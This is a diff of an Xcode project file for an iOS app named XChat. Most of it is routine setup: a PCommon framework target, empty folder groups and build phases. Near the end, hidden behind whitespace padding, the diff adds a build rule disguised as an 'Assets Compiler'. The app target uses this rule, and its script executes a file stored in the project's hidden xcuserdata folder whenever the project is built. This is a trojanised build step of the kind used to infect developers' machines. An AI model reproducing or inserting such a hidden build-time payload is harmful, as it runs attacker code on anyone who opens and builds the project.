@@ -8,7 +8,6 @@
 
 /* Begin PBXBuildFile section */
 		16F6916A25E4B8C7001663E0 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 16F6916925E4B8C7001663E0 /* AppDelegate.swift */; };
-		16F6916C25E4B8C7001663E0 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 16F6916B25E4B8C7001663E0 /* SceneDelegate.swift */; };
 		16F6916E25E4B8C7001663E0 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 16F6916D25E4B8C7001663E0 /* ViewController.swift */; };
 		16F6917125E4B8C7001663E0 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 16F6916F25E4B8C7001663E0 /* Main.storyboard */; };
 		16F6917425E4B8C7001663E0 /* XChat.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 16F6917225E4B8C7001663E0 /* XChat.xcdatamodeld */; };
@@ -16,6 +15,12 @@
 		16F6917925E4B8C9001663E0 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 16F6917725E4B8C9001663E0 /* LaunchScreen.storyboard */; };
 		16F6918425E4B8C9001663E0 /* XChatTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 16F6918325E4B8C9001663E0 /* XChatTests.swift */; };
 		16F6918F25E4B8C9001663E0 /* XChatUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 16F6918E25E4B8C9001663E0 /* XChatUITests.swift */; };
+		16FCA04425E4BCC7009F79AE /* PCommon.h in Headers */ = {isa = PBXBuildFile; fileRef = 16FCA04225E4BCC7009F79AE /* PCommon.h */; settings = {ATTRIBUTES = (Public, ); }; };
+		16FCA04725E4BCC7009F79AE /* PCommon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 16FCA04025E4BCC7009F79AE /* PCommon.framework */; };
+		16FCA04825E4BCC7009F79AE /* PCommon.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 16FCA04025E4BCC7009F79AE /* PCommon.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
+		16FCA06A25E4C165009F79AE /* PCommon.bundle in Resources */ = {isa = PBXBuildFile; fileRef = 16FCA06925E4C165009F79AE /* PCommon.bundle */; };
+		16FCA06B25E4C165009F79AE /* PCommon.bundle in Resources */ = {isa = PBXBuildFile; fileRef = 16FCA06925E4C165009F79AE /* PCommon.bundle */; };
+		16FCA08025E4E535009F79AE /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 16FCA07F25E4E535009F79AE /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -33,12 +38,32 @@
 			remoteGlobalIDString = 16F6916525E4B8C7001663E0;
 			remoteInfo = XChat;
 		};
+		16FCA04525E4BCC7009F79AE /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 16F6915E25E4B8C7001663E0 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 16FCA03F25E4BCC7009F79AE;
+			remoteInfo = PCommon;
+		};
 /* End PBXContainerItemProxy section */
+
+/* Begin PBXCopyFilesBuildPhase section */
+		16F691BE25E4BAB0001663E0 /* Embed Frameworks */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = "";
+			dstSubfolderSpec = 10;
+			files = (
+				16FCA04825E4BCC7009F79AE /* PCommon.framework in Embed Frameworks */,
+			);
+			name = "Embed Frameworks";
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
 		16F6916625E4B8C7001663E0 /* XChat.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = XChat.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		16F6916925E4B8C7001663E0 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
-		16F6916B25E4B8C7001663E0 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
 		16F6916D25E4B8C7001663E0 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		16F6917025E4B8C7001663E0 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		16F6917325E4B8C7001663E0 /* XChat.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = XChat.xcdatamodel; sourceTree = "<group>"; };
@@ -51,6 +76,11 @@
 		16F6918A25E4B8C9001663E0 /* XChatUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = XChatUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		16F6918E25E4B8C9001663E0 /* XChatUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = XChatUITests.swift; sourceTree = "<group>"; };
 		16F6919025E4B8C9001663E0 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		16FCA04025E4BCC7009F79AE /* PCommon.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = PCommon.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		16FCA04225E4BCC7009F79AE /* PCommon.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PCommon.h; sourceTree = "<group>"; };
+		16FCA04325E4BCC7009F79AE /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		16FCA06925E4C165009F79AE /* PCommon.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = PCommon.bundle; sourceTree = "<group>"; };
+		16FCA07F25E4E535009F79AE /* README.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -58,6 +88,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				16FCA04725E4BCC7009F79AE /* PCommon.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -75,6 +106,13 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		16FCA03D25E4BCC7009F79AE /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
@@ -84,6 +122,7 @@
 				16F6916825E4B8C7001663E0 /* XChat */,
 				16F6918225E4B8C9001663E0 /* XChatTests */,
 				16F6918D25E4B8C9001663E0 /* XChatUITests */,
+				16FCA04125E4BCC7009F79AE /* PCommon */,
 				16F6916725E4B8C7001663E0 /* Products */,
 			);
 			sourceTree = "<group>";
@@ -94,6 +133,7 @@
 				16F6916625E4B8C7001663E0 /* XChat.app */,
 				16F6917F25E4B8C9001663E0 /* XChatTests.xctest */,
 				16F6918A25E4B8C9001663E0 /* XChatUITests.xctest */,
+				16FCA04025E4BCC7009F79AE /* PCommon.framework */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -101,14 +141,16 @@
 		16F6916825E4B8C7001663E0 /* XChat */ = {
 			isa = PBXGroup;
 			children = (
+				16FCA05325E4BD27009F79AE /* Common */,
+				16FCA03025E4BC75009F79AE /* Business */,
 				16F6916925E4B8C7001663E0 /* AppDelegate.swift */,
-				16F6916B25E4B8C7001663E0 /* SceneDelegate.swift */,
 				16F6916D25E4B8C7001663E0 /* ViewController.swift */,
 				16F6916F25E4B8C7001663E0 /* Main.storyboard */,
 				16F6917525E4B8C9001663E0 /* Assets.xcassets */,
 				16F6917725E4B8C9001663E0 /* LaunchScreen.storyboard */,
 				16F6917A25E4B8C9001663E0 /* Info.plist */,
 				16F6917225E4B8C7001663E0 /* XChat.xcdatamodeld */,
+				16FCA07F25E4E535009F79AE /* README.md */,
 			);
 			path = XChat;
 			sourceTree = "<group>";
@@ -131,7 +173,114 @@
 			path = XChatUITests;
 			sourceTree = "<group>";
 		};
+		16FCA03025E4BC75009F79AE /* Business */ = {
+			isa = PBXGroup;
+			children = (
+				16FCA03125E4BC75009F79AE /* Managers */,
+				16FCA03225E4BC75009F79AE /* Base */,
+			);
+			path = Business;
+			sourceTree = "<group>";
+		};
+		16FCA03125E4BC75009F79AE /* Managers */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Managers;
+			sourceTree = "<group>";
+		};
+		16FCA03225E4BC75009F79AE /* Base */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Base;
+			sourceTree = "<group>";
+		};
+		16FCA04125E4BCC7009F79AE /* PCommon */ = {
+			isa = PBXGroup;
+			children = (
+				16FCA04225E4BCC7009F79AE /* PCommon.h */,
+				16FCA04325E4BCC7009F79AE /* Info.plist */,
+			);
+			path = PCommon;
+			sourceTree = "<group>";
+		};
+		16FCA05325E4BD27009F79AE /* Common */ = {
+			isa = PBXGroup;
+			children = (
+				16FCA05425E4BD27009F79AE /* UI */,
+				16FCA05525E4BD27009F79AE /* Tools */,
+				16FCA05625E4BD27009F79AE /* Category */,
+				16FCA05725E4BD27009F79AE /* Framework */,
+				16FCA05825E4BD27009F79AE /* Config */,
+				16FCA05925E4BD27009F79AE /* Resource */,
+				16FCA05A25E4BD27009F79AE /* Data */,
+			);
+			path = Common;
+			sourceTree = "<group>";
+		};
+		16FCA05425E4BD27009F79AE /* UI */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = UI;
+			sourceTree = "<group>";
+		};
+		16FCA05525E4BD27009F79AE /* Tools */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Tools;
+			sourceTree = "<group>";
+		};
+		16FCA05625E4BD27009F79AE /* Category */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Category;
+			sourceTree = "<group>";
+		};
+		16FCA05725E4BD27009F79AE /* Framework */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Framework;
+			sourceTree = "<group>";
+		};
+		16FCA05825E4BD27009F79AE /* Config */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Config;
+			sourceTree = "<group>";
+		};
+		16FCA05925E4BD27009F79AE /* Resource */ = {
+			isa = PBXGroup;
+			children = (
+				16FCA06925E4C165009F79AE /* PCommon.bundle */,
+			);
+			path = Resource;
+			sourceTree = "<group>";
+		};
+		16FCA05A25E4BD27009F79AE /* Data */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Data;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
+
+/* Begin PBXHeadersBuildPhase section */
+		16FCA03B25E4BCC7009F79AE /* Headers */ = {
+			isa = PBXHeadersBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				16FCA04425E4BCC7009F79AE /* PCommon.h in Headers */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXHeadersBuildPhase section */
 
 /* Begin PBXNativeTarget section */
 		16F6916525E4B8C7001663E0 /* XChat */ = {
@@ -141,10 +290,13 @@
 				16F6916225E4B8C7001663E0 /* Sources */,
 				16F6916325E4B8C7001663E0 /* Frameworks */,
 				16F6916425E4B8C7001663E0 /* Resources */,
+				16F691BE25E4BAB0001663E0 /* Embed Frameworks */,
 			);
 			buildRules = (
+				B1FACB388A4C1D4A21AAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
+				16FCA04625E4BCC7009F79AE /* PBXTargetDependency */,
 			);
 			name = XChat;
 			productName = XChat;
@@ -187,6 +339,24 @@
 			productReference = 16F6918A25E4B8C9001663E0 /* XChatUITests.xctest */;
 			productType = "com.apple.product-type.bundle.ui-testing";
 		};
+		16FCA03F25E4BCC7009F79AE /* PCommon */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 16FCA04925E4BCC7009F79AE /* Build configuration list for PBXNativeTarget "PCommon" */;
+			buildPhases = (
+				16FCA03B25E4BCC7009F79AE /* Headers */,
+				16FCA03C25E4BCC7009F79AE /* Sources */,
+				16FCA03D25E4BCC7009F79AE /* Frameworks */,
+				16FCA03E25E4BCC7009F79AE /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = PCommon;
+			productName = PCommon;
+			productReference = 16FCA04025E4BCC7009F79AE /* PCommon.framework */;
+			productType = "com.apple.product-type.framework";
+		};
 /* End PBXNativeTarget section */
 
 /* Begin PBXProject section */
@@ -207,6 +377,10 @@
 						CreatedOnToolsVersion = 12.1;
 						TestTargetID = 16F6916525E4B8C7001663E0;
 					};
+					16FCA03F25E4BCC7009F79AE = {
+						CreatedOnToolsVersion = 12.1;
+						LastSwiftMigration = 1210;
+					};
 				};
 			};
 			buildConfigurationList = 16F6916125E4B8C7001663E0 /* Build configuration list for PBXProject "XChat" */;
@@ -225,6 +399,7 @@
 				16F6916525E4B8C7001663E0 /* XChat */,
 				16F6917E25E4B8C9001663E0 /* XChatTests */,
 				16F6918925E4B8C9001663E0 /* XChatUITests */,
+				16FCA03F25E4BCC7009F79AE /* PCommon */,
 			);
 		};
 /* End PBXProject section */
@@ -236,7 +411,9 @@
 			files = (
 				16F6917925E4B8C9001663E0 /* LaunchScreen.storyboard in Resources */,
 				16F6917625E4B8C9001663E0 /* Assets.xcassets in Resources */,
+				16FCA08025E4E535009F79AE /* README.md in Resources */,
 				16F6917125E4B8C7001663E0 /* Main.storyboard in Resources */,
+				16FCA06A25E4C165009F79AE /* PCommon.bundle in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -254,7 +431,26 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		16FCA03E25E4BCC7009F79AE /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				16FCA06B25E4C165009F79AE /* PCommon.bundle in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		16F6916225E4B8C7001663E0 /* Sources */ = {
@@ -264,7 +460,6 @@
 				16F6916E25E4B8C7001663E0 /* ViewController.swift in Sources */,
 				16F6916A25E4B8C7001663E0 /* AppDelegate.swift in Sources */,
 				16F6917425E4B8C7001663E0 /* XChat.xcdatamodeld in Sources */,
-				16F6916C25E4B8C7001663E0 /* SceneDelegate.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -284,6 +479,13 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		16FCA03C25E4BCC7009F79AE /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
@@ -296,6 +498,11 @@
 			isa = PBXTargetDependency;
 			target = 16F6916525E4B8C7001663E0 /* XChat */;
 			targetProxy = 16F6918B25E4B8C9001663E0 /* PBXContainerItemProxy */;
+		};
+		16FCA04625E4BCC7009F79AE /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 16FCA03F25E4BCC7009F79AE /* PCommon */;
+			targetProxy = 16FCA04525E4BCC7009F79AE /* PBXContainerItemProxy */;
 		};
 /* End PBXTargetDependency section */
 
@@ -557,6 +764,63 @@
 			};
 			name = Release;
 		};
+		16FCA04A25E4BCC7009F79AE /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEFINES_MODULE = YES;
+				DEVELOPMENT_TEAM = JR7MYSKR76;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				INFOPLIST_FILE = PCommon/Info.plist;
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.MM.PCommon;
+				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
+				SKIP_INSTALL = YES;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Debug;
+		};
+		16FCA04B25E4BCC7009F79AE /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEFINES_MODULE = YES;
+				DEVELOPMENT_TEAM = JR7MYSKR76;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				INFOPLIST_FILE = PCommon/Info.plist;
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.MM.PCommon;
+				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
+				SKIP_INSTALL = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Release;
+		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
@@ -596,7 +860,51 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
+		16FCA04925E4BCC7009F79AE /* Build configuration list for PBXNativeTarget "PCommon" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				16FCA04A25E4BCC7009F79AE /* Debug */,
+				16FCA04B25E4BCC7009F79AE /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		B1FACB388A4C1D4A21AAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		16F6917225E4B8C7001663E0 /* XChat.xcdatamodeld */ = {
